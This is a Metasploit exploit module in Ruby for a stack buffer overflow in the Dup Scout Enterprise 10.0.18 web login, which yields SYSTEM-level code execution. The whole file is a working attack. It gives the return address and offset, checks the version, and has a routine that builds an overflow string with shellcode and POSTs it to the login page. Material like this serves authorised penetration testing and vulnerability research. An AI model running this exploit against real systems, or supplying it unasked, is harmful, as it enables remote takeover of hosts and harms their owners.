# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Dup Scout Enterprise Login Buffer Overflow&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a stack buffer overflow in Dup Scout Enterprise
        10.0.18. The buffer overflow exists via the web interface during
        login. This gives NT AUTHORITY\SYSTEM access.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Chris Higgins&#039;, # msf Module -- @ch1gg1ns
          &#039;sickness&#039; # Original discovery
        ],
      &#039;References&#039;     =>
        [
          [ &#039;EDB&#039;, &#039;43145&#039; ]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00\x0a\x0d\x25\x26\x2b\x3d"
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Dup Scout Enterprise 10.0.18&#039;,
            {
              &#039;Ret&#039; => 0x10090c83, # jmp esp - libspp.dll
              &#039;Offset&#039; => 780
            }
          ],
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Nov 14 2017&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options([Opt::RPORT(80)])

  end

  def check
    res = send_request_cgi({
      &#039;uri&#039;    => &#039;/&#039;,
      &#039;method&#039; => &#039;GET&#039;
    })

    if res and res.code == 200 and res.body =~ /Dup Scout Enterprise v10\.0\.18/
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    connect

    print_status("Generating exploit...")

    evil =  rand_text(target[&#039;Offset&#039;])
    evil << [target.ret].pack(&#039;V&#039;)
    evil << make_nops(12)
    evil << payload.encoded
    evil << make_nops(10000 - evil.length)

    vprint_status("Evil length: " + evil.length.to_s)

    sploit =  "username="
    sploit << evil
    sploit << "&password="
    sploit << rand_text(evil.length)
    sploit << "\r\n"

    print_status("Triggering the exploit now...")

    res = send_request_cgi({
      &#039;uri&#039; => &#039;/login&#039;,
      &#039;method&#039; => &#039;POST&#039;,
      &#039;content-type&#039; => &#039;application/x-www-form-urlencoded&#039;,
      &#039;content-length&#039; => &#039;17000&#039;,
      &#039;data&#039; => sploit
    })

    handler
    disconnect

  end
end

